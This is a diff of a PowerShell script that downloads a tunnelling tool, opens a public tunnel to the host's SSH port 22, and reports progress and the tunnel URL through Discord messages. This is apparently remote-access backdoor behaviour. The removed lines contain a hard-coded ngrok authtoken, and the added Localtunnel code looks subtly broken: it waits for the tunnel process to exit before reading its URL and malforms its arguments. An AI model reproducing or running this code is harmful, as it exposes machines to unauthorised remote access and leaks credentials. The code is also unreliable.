@@ -64,26 +64,21 @@ try {
     $Port = 22
     Send-DiscordMessage "SSH Port: $Port"
 
-    # Install ngrok if not installed
-    Send-DiscordMessage "Checking for ngrok installation..."
-    Invoke-WebRequest -Uri https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile "$env:TEMP\ngrok.zip"
-    Expand-Archive "$env:TEMP\ngrok.zip" -DestinationPath "$env:ProgramFiles"
-    Remove-Item "$env:TEMP\ngrok.zip"
-    Send-DiscordMessage "ngrok installed successfully."
+    # Install Localtunnel
+    Send-DiscordMessage "Installing Localtunnel..."
+    Invoke-WebRequest -Uri https://github.com/localtunnel/localtunnel/releases/download/v2.0.0-beta.15/localtunnel-2.0.0-beta.15-windows-x64.zip -OutFile "$env:TEMP\localtunnel.zip"
+    Expand-Archive "$env:TEMP\localtunnel.zip" -DestinationPath "$env:ProgramFiles"
+    Remove-Item "$env:TEMP\localtunnel.zip"
+    Send-DiscordMessage "Localtunnel installed successfully."
 
-    # Set up ngrok with authtoken (replace with your actual authtoken)
-    $NgrokAuthToken = "2WU1ah9rzwH5TgeVVhhajS9IqM3_4mALPaeeqrwccVETjceEb"
-    & "$env:ProgramFiles\ngrok.exe" authtoken $NgrokAuthToken
-
-    # Start ngrok tunnel
-    Send-DiscordMessage "Setting up SSH tunnel using ngrok..."
-    $TunnelProcess = Start-Process -FilePath "$env:ProgramFiles\ngrok.exe" -ArgumentList "tcp", "22" -PassThru
+    # Start Localtunnel tunnel for SSH
+    Send-DiscordMessage "Setting up SSH tunnel using Localtunnel..."
+    $TunnelProcess = Start-Process -FilePath "$env:ProgramFiles\localtunnel-2.0.0-beta.15-windows-x64\localtunnel.exe" -ArgumentList "--port 22" -PassThru
     $TunnelProcess.WaitForExit()
 
-    # Capture the public URL from ngrok (output of the command)
-    Start-Sleep -Seconds 5  # Wait for ngrok to generate the URL
-    $NgrokStatus = Get-Content "$env:ProgramFiles\ngrok.yml" -Raw
-    $TunnelURL = ($NgrokStatus | Select-String -Pattern "tcp://.*" | ForEach-Object { $_.Line.Trim() })
+    # Capture the public URL from Localtunnel
+    Start-Sleep -Seconds 5  # Wait for Localtunnel to generate the URL
+    $TunnelURL = (Get-Content "$env:ProgramFiles\localtunnel-2.0.0-beta.15-windows-x64\localtunnel-stdout.log" -Tail 10) | Select-String -Pattern "your url is" | ForEach-Object { $_.Line.Split(" ")[4] }
     Send-DiscordMessage "SSH Tunnel setup complete. Tunnel URL: $TunnelURL"
 
     # Final message
